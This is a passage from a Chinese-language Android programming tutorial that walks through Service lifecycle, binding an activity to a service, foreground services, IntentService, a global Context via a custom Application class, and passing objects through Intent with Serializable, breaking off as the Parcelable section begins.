class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行后，点击Start Service，可以发现onCreate和onStartCommand()方法都执行了，并且还可以在Setting-&gt;Developer options-&gt;Running services中找到它。然后点击Stop Service服务就会停止了。</p>
<p>另外，onCreate()方法是服务第一次创建时调用的，而onStartCommand()方法则在每次服务启动的时候都会调用。</p>
<h3 id="活动和服务进行通信"><a href="#活动和服务进行通信" class="headerlink" title="活动和服务进行通信"></a>活动和服务进行通信</h3><p>修改Myservice代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"startDownload execute"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"getProgress execute"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改布局文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/stop_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Stop Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/bind_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Bind Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/unbind_service"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Unbind Service"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;</span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button bindService = (Button) findViewById(R.id.bind_service);</span><br><span class="line">        bindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button unbindService = (Button) findViewById(R.id.unbind_service);</span><br><span class="line">        unbindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，onServiceConnected()方法会在活动与服务绑定成功时调用，onServiceDisconnected()方法会在活动与服务解绑时调用。</p>
<p>bindService()方法将MainActivity进行绑定，其中第一个参数是Intent对象，第二个参数是前面的 ServiceConnection实例，第三个是参数为，BIND_AUTO_CREATE表示活动和服务进行绑定后自动创建服务，这会使得MyService中的onCreate()方法得到执行，但onStartCommand()方法不会执行。</p>
<p>注意的是任何一个服务在整个应用程序范围内都是通用的，即Myservice可以喝任何一个活动绑定，而且在绑定完成后他们都可以获取到相同的DownloadBinder实例。</p>
<h2 id="服务的生命周期"><a href="#服务的生命周期" class="headerlink" title="服务的生命周期"></a>服务的生命周期</h2><p>一旦在项目中任何位置调用了Context的startService()方法，相应的服务就会启动，并回调onStartCommand()方法。如果服务还未被创建过，onCreate()方法会先于onStartCommand()方法执行。服务启动后会一直保持运行状态，直到stopService()或stopSelf()方法被调用。另外虽然每调用一次startService()方法，onStartCommand()就会执行一次，但实际上每个服务都只会存在一个实例。所以只需要调用一次stopService()或stopSelf()方法，服务就会停止。</p>
<p>根据Android系统的机制，一个服务只要被启动或被绑定之后，就会一直处于运行状态，必须要让以上两种条件同时不满足，服务才能被销毁。</p>
<h2 id="服务的更多技巧"><a href="#服务的更多技巧" class="headerlink" title="服务的更多技巧"></a>服务的更多技巧</h2><h3 id="使用前台服务"><a href="#使用前台服务" class="headerlink" title="使用前台服务"></a>使用前台服务</h3><p>前台服务可以避免因系统出现内存不足的情况时被回收的情况发生。前台服务会一直又一个正在运行的图标在系统状态栏显示。</p>
<p>修改Myservice：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"startDownload execute"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">"Myservice"</span>,<span class="string">"getProgress execute"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onCreate execute"</span>);</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MainActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        PendingIntent pi = PendingIntent.getActivity(<span class="keyword">this</span>, <span class="number">0</span>, intent, <span class="number">0</span>);</span><br><span class="line">        Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(<span class="keyword">this</span>,<span class="string">"default"</span>)</span><br><span class="line">                .setContentTitle(<span class="string">"Myservice"</span>)</span><br><span class="line">                .setContentText(<span class="string">"This is Myservice"</span>)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher))</span><br><span class="line">                .setContentIntent(pi)</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Myservice"</span>,<span class="string">"onDestroy execute"</span>);</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在其中添加了通知的内容，并且调用startForeground()方法将其显示出来。</p>
<h3 id="使用IntentService"><a href="#使用IntentService" class="headerlink" title="使用IntentService"></a>使用IntentService</h3><p>服务中的代码都是默认运行在主线程中的，可以使用多线程技术，让服务避免ANR的情况：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span></span>&#123;</span><br><span class="line">    Log.d(<span class="string">"Myservice"</span>,<span class="string">"onStartCommand execute"</span>);</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">            stopSelf();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用stopSelf()可以让服务在执行完毕后自动停止。</p>
<p>而IntentService可以完成创建新线程和自动停止的功能。</p>
<p>新建MyIntentService类继承自IntentService，修改代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyIntentService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">MyIntentService</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">"MyIntentService"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onHandleIntent</span><span class="params">(Intent intent)</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"MyIntentService"</span>, <span class="string">"Thread id is "</span>+ Thread.currentThread().getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">"MyIntentService"</span>, <span class="string">"onDestroy executed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>添加布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/start_intent_service"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Start IntentService"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改MainActivity代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;</span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;</span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService = (Button) findViewById(R.id.start_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button bindService = (Button) findViewById(R.id.bind_service);</span><br><span class="line">        bindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button unbindService = (Button) findViewById(R.id.unbind_service);</span><br><span class="line">        unbindService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Button startIntentService = (Button) findViewById(R.id.start_intent_service);</span><br><span class="line">        startIntentService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())&#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_intent_service:</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"Thread id is "</span>+ Thread.currentThread().getId());</span><br><span class="line">                Intent intentService = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyIntentService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startService(intentService);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，在AndroidManifest.xml中注册该服务：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyIntentService"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就会自动创建一个线程去执行服务，并自动停止了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>服务是Android实现后台运行的解决方案，但其不会自动创建线程，需要手动去实现。</p>
<p>一个服务的声明周期从onCreate()到onStartCommand()，最终再到onDetory()。另外也可以通过bind()绑定一个服务，并进行通信，但需要相应的unbind()解绑后服务才会被销毁，并且也不会经过onStartCommand()过程。可以通过类似通知的机制将后台服务转变为前台服务从而避免被系统回收。另外也可以使用IntentService类实现自动化创建子线程并自动回收。</p>
<p>Android的子线程不可以操作主线程的UI，但可以通过异步消息处理机制向主线程发送消息，从而去修改UI。</p>
<p>Android的异步消息处理机制主要包括Message、Handle、MessageQueue和Looper，通过他们可以实现子线程与主线程的消息传递。</p>
<h1 id="进阶——高级技巧"><a href="#进阶——高级技巧" class="headerlink" title="进阶——高级技巧"></a>进阶——高级技巧</h1><h2 id="全局获取Context技巧"><a href="#全局获取Context技巧" class="headerlink" title="全局获取Context技巧"></a>全局获取Context技巧</h2><p>Android提供了一个Application类，每当应用程序启动时，系统就会自动将这个类进行初始化，我们可以自己定义一个MyApplication类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Context context;</span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        context = getApplicationContext();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title">getContext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在<code>&lt;application&gt;</code>标签下修改初始化类：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:name</span>=<span class="string">"con.example.project.MyApplication"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">...</span></span></span><br><span class="line"><span class="tag">             <span class="attr">...</span>&gt;</span></span><br><span class="line">    		...</span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中project替换成项目名称，这样后在项目中任何地方调用MyApplication.getContext()即可获取到Context了。</p>
<p>同时一个项目只能配置一个Application，如果有其他的Application，比如LitePal，只需要在MyApplication中调用LitePal的初始化方法即可：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApplication</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Context context;</span><br><span class="line">    <span class="meta">@Override</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        context = getApplicationContext();</span><br><span class="line">        LitePalApplication.initialize(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Context <span class="title">getContext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用Intent传递对象"><a href="#使用Intent传递对象" class="headerlink" title="使用Intent传递对象"></a>使用Intent传递对象</h2><p>Intent传递对象通常有两种实现方式：Serializable和Parcelable。</p>
<h3 id="Serializable方式"><a href="#Serializable方式" class="headerlink" title="Serializable方式"></a>Serializable方式</h3><p>Serializable是序列化的意思，表示将一个对象转换成可存储或可传输的状态。</p>
<p>比如有一个Person类，包含name和age两个字段，要将其序列化可以这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来FirstActivity中的写法非常简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = <span class="keyword">new</span> Person();</span><br><span class="line">person.setName(<span class="string">"Tom"</span>);</span><br><span class="line">person.setAge(<span class="number">20</span>);</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">intent.putExtra(<span class="string">"person_data"</span>, person);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p>在SecondActivity种获取这个对象也很简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person = (Person) getIntent().getSerializableExtra(<span class="string">"person_data"</span>);</span><br></pre></td></tr></table></figure>

<p>这样就实现了用Serializable完成Intent传递对象的功能。</p>
<h3 id="Parcelable方式"><a href="#Parcelable方式" class="headerlink" title="Parcelable方式"></a>Parcelable方式</h3><p>Parcelable是将一个完整的对象进行分解。</p>
<p>修改Person代码：</p>
